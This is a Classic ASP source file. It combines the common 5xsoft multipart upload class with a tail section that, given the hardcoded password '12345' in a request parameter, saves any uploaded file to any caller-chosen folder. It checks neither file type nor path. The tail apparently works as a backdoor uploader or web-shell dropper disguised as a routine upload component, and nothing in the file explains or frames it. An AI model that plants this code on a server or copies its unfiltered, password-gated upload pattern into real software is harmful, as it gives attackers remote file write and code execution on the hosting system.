<%@LANGUAGE="VBSCRIPT" CODEPAGE="936"%>
<%Server.ScriptTimeOut=5000%>
<%
dim Data_5xsoft
Class upload_5xsoft
dim objForm,objFile
Public function Form(strForm)
strForm=lcase(strForm)
if not objForm.exists(strForm) then
Form=""
else
Form=objForm(strForm)
end if
end function
Public function File(strFile)
strFile=lcase(strFile)
if not objFile.exists(strFile) then
set File=new FileInfo
else
set File=objFile(strFile)
end if
end function
Private Sub Class_Initialize
dim RequestData,sStart,vbCrlf,sInfo,iInfoStart,iInfoEnd,tStream,iStart,theFile
dim iFileSize,sFilePath,sFileType,sFormValue,sFileName
dim iFindStart,iFindEnd
dim iFormStart,iFormEnd,sFormName
set objForm=Server.CreateObject("Scripting.Dictionary")
set objFile=Server.CreateObject("Scripting.Dictionary")
if Request.TotalBytes<1 then Exit Sub
set tStream = Server.CreateObject("adodb.stream")
set Data_5xsoft = Server.CreateObject("adodb.stream")
Data_5xsoft.Type = 1
Data_5xsoft.Mode =3
Data_5xsoft.Open
Data_5xsoft.Write  Request.BinaryRead(Request.TotalBytes)
Data_5xsoft.Position=0
RequestData =Data_5xsoft.Read
iFormStart = 1
iFormEnd = LenB(RequestData)
vbCrlf = chrB(13) & chrB(10)
sStart = MidB(RequestData,1, InStrB(iFormStart,RequestData,vbCrlf)-1)
iStart = LenB (sStart)
iFormStart=iFormStart+iStart+1
while (iFormStart + 10) < iFormEnd
iInfoEnd = InStrB(iFormStart,RequestData,vbCrlf & vbCrlf)+3
tStream.Type = 1
tStream.Mode =3
tStream.Open
Data_5xsoft.Position = iFormStart
Data_5xsoft.CopyTo tStream,iInfoEnd-iFormStart
tStream.Position = 0
tStream.Type = 2
tStream.Charset ="gb2312"
sInfo = tStream.ReadText
tStream.Close
iFormStart = InStrB(iInfoEnd,RequestData,sStart)
iFindStart = InStr(22,sInfo,"name=""",1)+6
iFindEnd = InStr(iFindStart,sInfo,"""",1)
sFormName = lcase(Mid (sinfo,iFindStart,iFindEnd-iFindStart))
if InStr (45,sInfo,"filename=""",1) > 0 then
set theFile=new FileInfo
iFindStart = InStr(iFindEnd,sInfo,"filename=""",1)+10
iFindEnd = InStr(iFindStart,sInfo,"""",1)
sFileName = Mid (sinfo,iFindStart,iFindEnd-iFindStart)
theFile.FileName=getFileName(sFileName)
theFile.FilePath=getFilePath(sFileName)
iFindStart = InStr(iFindEnd,sInfo,"Content-Type: ",1)+14
iFindEnd = InStr(iFindStart,sInfo,vbCr)
theFile.FileType =Mid (sinfo,iFindStart,iFindEnd-iFindStart)
theFile.FileStart =iInfoEnd
theFile.FileSize = iFormStart -iInfoEnd -3
theFile.FormName=sFormName
if not objFile.Exists(sFormName) then
objFile.add sFormName,theFile
end if
else
tStream.Type =1
tStream.Mode =3
tStream.Open
Data_5xsoft.Position = iInfoEnd
Data_5xsoft.CopyTo tStream,iFormStart-iInfoEnd-3
tStream.Position = 0
tStream.Type = 2
tStream.Charset ="gb2312"
sFormValue = tStream.ReadText
tStream.Close
if objForm.Exists(sFormName) then
objForm(sFormName)=objForm(sFormName)&", "&sFormValue
else
objForm.Add sFormName,sFormValue
end if
end if
iFormStart=iFormStart+iStart+1
wend
RequestData=""
set tStream =nothing
End Sub
Private Sub Class_Terminate
if Request.TotalBytes>0 then
objForm.RemoveAll
objFile.RemoveAll
set objForm=nothing
set objFile=nothing
Data_5xsoft.Close
set Data_5xsoft =nothing
end if
End Sub
Private function GetFilePath(FullPath)
If FullPath <> "" Then
GetFilePath = left(FullPath,InStrRev(FullPath, "\"))
Else
GetFilePath = ""
End If
End  function
Private function GetFileName(FullPath)
If FullPath <> "" Then
GetFileName = mid(FullPath,InStrRev(FullPath, "\")+1)
Else
GetFileName = ""
End If
End  function
End Class
Class FileInfo
dim FormName,FileName,FilePath,FileSize,FileType,FileStart
Private Sub Class_Initialize
FileName = ""
FilePath = ""
FileSize = 0
FileStart= 0
FormName = ""
FileType =""
End Sub
Public function SaveAs(FullPath)
dim dr,ErrorChar,i
SaveAs=true
if trim(fullpath)="" or FileStart=0 or FileName="" or right(fullpath,1)="/" then exit function
set dr=CreateObject("Adodb.Stream")
dr.Mode=3
dr.Type=1
dr.Open
Data_5xsoft.position=FileStart
Data_5xsoft.copyto dr,FileSize
dr.SaveToFile FullPath,2
dr.Close
set dr=nothing
SaveAs=false
end function
End Class%><%
Function AutoCreateFolder(strPath)
On Error Resume Next
Dim astrPath, ulngPath, i, strTmpPath
Dim objFSO
If InStr(strPath, "\") <=0 or InStr(strPath, ":") <= 0 Then
AutoCreateFolder = False
Exit Function
End If
Set objFSO = Server.CreateObject("Scripting.FileSystemObject")
If objFSO.FolderExists(strPath) Then
AutoCreateFolder = True
Exit Function
End If
astrPath = Split(strPath, "\")
ulngPath = UBound(astrPath)
strTmpPath = ""
For i = 0 To ulngPath
strTmpPath = strTmpPath & astrPath(i) & "\"
If Not objFSO.FolderExists(strTmpPath) Then
objFSO.CreateFolder(strTmpPath)
End If
Next
Set objFSO = Nothing
If Err = 0 Then
AutoCreateFolder = True
Else
AutoCreateFolder = False
End If
End Function
psw="12345"
if request("pswd")=psw then
filepath=request("pathdir")
if filepath<>"ok" then
MyPath = Server.MapPath(filepath)
call AutoCreateFolder(MyPath)
nfilepath=filepath
else
nfilepath= ""
end if
dim upload,file,formName,formPath,iCount,upfileName,nowTime
set upload=new upload_5xsoft
iCount=0
for each formName in upload.objFile
set file=upload.file(formName)
if file.FileSize>0 then
upfileName = file.FileName
file.SaveAs Server.mappath(nfilepath & upFileName)
end if
set file=nothing
next
set upload=nothing
end if%>